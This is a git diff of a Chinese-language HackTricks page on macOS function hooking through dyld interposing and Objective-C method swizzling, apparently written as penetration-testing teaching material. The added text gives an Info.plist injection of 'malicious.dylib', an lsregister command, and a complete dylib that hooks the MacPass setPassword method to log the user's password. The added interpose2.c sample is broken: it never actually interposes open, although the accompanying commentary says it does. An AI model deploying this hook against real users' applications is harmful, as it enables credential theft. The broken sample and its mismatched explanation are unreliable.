@@ -5,20 +5,20 @@
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
 * **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
-## 函数替换
+## 函数插入
 
-创建一个包含指向**原始函数**和**替换函数**的**函数指针**元组的**dylib**，并带有一个**`__interpose`**部分（或带有**`S_INTERPOSING`**标志的部分）。
+创建一个包含指向**原始**和**替代**函数的**函数指针**元组的**dylib**，并带有一个**`__interpose`**部分（或带有**`S_INTERPOSING`**标志的部分）。
 
-然后，使用**`DYLD_INSERT_LIBRARIES`**注入dylib（替换需要在主应用程序加载之前发生）。显然，这个限制受到了对DYLD\_INSERT\_LIBRARIES使用的限制。&#x20;
+然后，使用**`DYLD_INSERT_LIBRARIES`**注入dylib（插入必须在主应用程序加载之前进行）。显然，[**对使用**`DYLD_INSERT_LIBRARIES`**的限制也适用于此处**](../macos-proces-abuse/macos-library-injection/#check-restrictions)。
 
-### 替换printf
+### 插入printf
 
 {% tabs %}
 {% tab title="interpose.c" %}
@@ -34,7 +34,7 @@ int my_printf(const char *format, ...) {
 //int ret = vprintf(format, args);
 //va_end(args);
 
-int ret = printf("[+] Hello from interpose\n");
+int ret = printf("Hello from interpose\n");
 return ret;
 }
 
@@ -50,19 +50,115 @@ __attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned lon
 #include <stdio.h>
 
 int main() {
-printf("Hello, World!\n");
+printf("Hello World!\n");
 return 0;
 }
+```
+{% tab title="interpose2.c" %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <dlfcn.h>
+
+// Define the function pointer type for the original function
+typedef int (*orig_open_type)(const char *pathname, int flags);
+
+// Define the function pointer type for the interposed function
+typedef int (*interposed_open_type)(const char *pathname, int flags);
+
+// Define the interposed function
+int interposed_open(const char *pathname, int flags) {
+    printf("Interposed open called with pathname: %s\n", pathname);
+    
+    // Get the handle to the original function
+    void *handle = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
+    orig_open_type orig_open = (orig_open_type)dlsym(handle, "open");
+    
+    // Call the original function
+    int result = orig_open(pathname, flags);
+    
+    // Cleanup
+    dlclose(handle);
+    
+    return result;
+}
+
+// Define the constructor function
+__attribute__((constructor))
+void my_init() {
+    // Get the handle to the interposed function
+    void *handle = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
+    interposed_open_type interposed_open = (interposed_open_type)dlsym(handle, "open");
+    
+    // Get the handle to the original function
+    orig_open_type orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
+    
+    // Check if the interposed function is already set
+    if (interposed_open != orig_open) {
+        printf("Interposed function already set\n");
+        return;
+    }
+    
+    // Set the interposed function
+    if (orig_open != NULL) {
+        printf("Setting interposed function\n");
+        interposed_open = orig_open;
+    } else {
+        printf("Failed to get handle to original function\n");
+    }
+    
+    // Cleanup
+    dlclose(handle);
+}
+```
+
+这是一个使用函数钩子技术的示例代码。它演示了如何在macOS上使用函数钩子来拦截和修改`open`函数的行为。
+
+代码中定义了两个函数指针类型：`orig_open_type`用于指向原始函数，`interposed_open_type`用于指向拦截函数。
+
+`interposed_open`函数是拦截函数的实现。它会在被拦截的`open`函数被调用时被执行，并打印出传入的`pathname`参数。然后，它会获取到原始函数的句柄，并调用原始函数。最后，清理句柄并返回结果。
+
+`my_init`函数是构造函数，它会在程序加载时被自动调用。它首先获取到拦截函数和原始函数的句柄，然后检查拦截函数是否已经设置。如果已经设置，则打印一条消息并返回。否则，将原始函数设置为拦截函数。最后，清理句柄。
+
+通过使用这个示例代码，我们可以拦截和修改`open`函数的行为，以实现自定义的逻辑。
+
+{% endtab %}
+```c
+// Just another way to define an interpose
+// gcc -dynamiclib interpose2.c -o interpose2.dylib
+
+#include <stdio.h>
+
+#define DYLD_INTERPOSE(_replacement, _replacee) \
+__attribute__((used)) static struct { \
+const void* replacement; \
+const void* replacee; \
+} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
+(const void*) (unsigned long) &_replacement, \
+(const void*) (unsigned long) &_replacee \
+};
+
+int my_printf(const char *format, ...)
+{
+int ret = printf("Hello from interpose\n");
+return ret;
+}
+
+DYLD_INTERPOSE(my_printf,printf);
 ```
 {% endtab %}
 {% endtabs %}
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
-[+] Hello from interpose
+Hello from interpose
+
+DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
+Hello from interpose
 ```
 ## 方法交换
 
-在ObjectiveC中，方法的调用方式是：`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`
+在ObjectiveC中，方法的调用方式如下：**`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
 
 需要提供**对象**、**方法**和**参数**。当调用方法时，会使用函数**`objc_msgSend`**发送一条消息：`int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
 
@@ -144,7 +240,11 @@ return 0;
 ```
 ### 使用method\_exchangeImplementations进行方法交换
 
-函数method\_exchangeImplementations允许将一个函数的地址更改为另一个函数的地址。因此，当调用一个函数时，实际执行的是另一个函数。
+函数**`method_exchangeImplementations`**允许将一个函数的实现地址**更改为另一个函数**。
+
+{% hint style="danger" %}
+因此，当调用一个函数时，执行的是另一个函数。
+{% endhint %}
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
 
@@ -188,11 +288,17 @@ NSLog(@"Substring: %@", subString);
 return 0;
 }
 ```
+{% hint style="warning" %}
+在这种情况下，如果**合法方法的实现代码验证**了**方法名称**，它可以**检测**到这种交换并阻止其运行。
+
+以下技术没有此限制。
+{% endhint %}
+
 ### 使用method\_setImplementation进行方法交换
 
-之前的格式很奇怪，因为你正在改变一个方法的实现方式，将其替换为另一个方法。使用函数**`method_setImplementation`**，你可以将一个方法的实现方式**更改为另一个方法**。
+之前的格式很奇怪，因为你正在将一个方法的实现更改为另一个方法。使用函数**`method_setImplementation`**，您可以将一个方法的实现更改为另一个方法。
 
-只需记住，如果你打算在新的实现方式中调用原始方法的实现方式，**请先存储原始方法实现方式的地址**，因为稍后要定位该地址将变得更加复杂。
+只需记住，如果您要在新的实现中调用原始实现的地址，请在覆盖它之前将其存储起来，因为稍后要定位该地址会更加复杂。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -250,32 +356,80 @@ return 0;
 
 为了做到这一点，最简单的技术是通过环境变量或劫持来注入[Dyld](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)。然而，我猜这也可以通过[Dylib进程注入](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)来实现。
 
-然而，这两种选项都**限制**于**未受保护**的二进制文件/进程。请查看每种技术以了解更多限制信息。
+然而，这两种选项都**仅限于**未受保护的二进制文件/进程。请查看每种技术以了解更多限制。
 
-然而，函数钩子攻击非常具体，攻击者会使用这种方法来从进程内部窃取敏感信息（如果不是这样，你只会进行进程注入攻击）。而这些敏感信息可能位于用户下载的应用程序中，如MacPass。
+然而，函数钩子攻击非常具体，攻击者会使用这种方法来从进程内部窃取敏感信息（如果不是这样，你只会进行进程注入攻击）。而这些敏感信息可能位于用户下载的应用程序中，例如MacPass。
 
 因此，攻击者的方式要么是找到一个漏洞，要么是剥离应用程序的签名，通过应用程序的Info.plist注入**`DYLD_INSERT_LIBRARIES`**环境变量，添加类似以下内容：
 ```xml
 <key>LSEnvironment</key>
 <dict>
 <key>DYLD_INSERT_LIBRARIES</key>
-<string>/Applications/MacPass.app/Contents/malicious.dylib</string>
+<string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
-在该库中添加挂钩代码以窃取信息：密码、消息...
+然后**重新注册**应用程序：
 
+{% code overflow="wrap" %}
+```bash
+/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
+```
+{% endcode %}
+
+在该库中添加挂钩代码以外泄信息：密码、消息...
+
+{% hint style="danger" %}
+请注意，在较新版本的 macOS 中，如果您**剥离应用程序二进制文件的签名**并且该应用程序之前已被执行过，macOS将**不再执行该应用程序**。
+{% endhint %}
+
+#### 库示例
+```objectivec
+// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib
+
+// If you added env vars in the Info.plist don't forget to call lsregister as explained before
+
+// Listen to the logs with something like:
+// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'
+
+#include <Foundation/Foundation.h>
+#import <objc/runtime.h>
+
+// Here will be stored the real method (setPassword in this case) address
+static IMP real_setPassword = NULL;
+
+static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
+{
+// Function that will log the password and call the original setPassword(pass, file_path) method
+NSLog(@"[+] Password is: %@", password);
+
+// After logging the password call the original method so nothing breaks.
+return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
+}
+
+// Library constructor to execute
+__attribute__((constructor))
+static void customConstructor(int argc, const char **argv) {
+// Get the real method address to not lose it
+Class classMPDocument = NSClassFromString(@"MPDocument");
+Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
+
+// Make the original method setPassword call the fake implementation one
+IMP fake_IMP = (IMP)custom_setPassword;
+real_setPassword = method_setImplementation(real_Method, fake_IMP);
+}
+```
 ## 参考资料
 
 * [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者想要**获取最新版本的 PEASS 或下载 PDF 格式的 HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
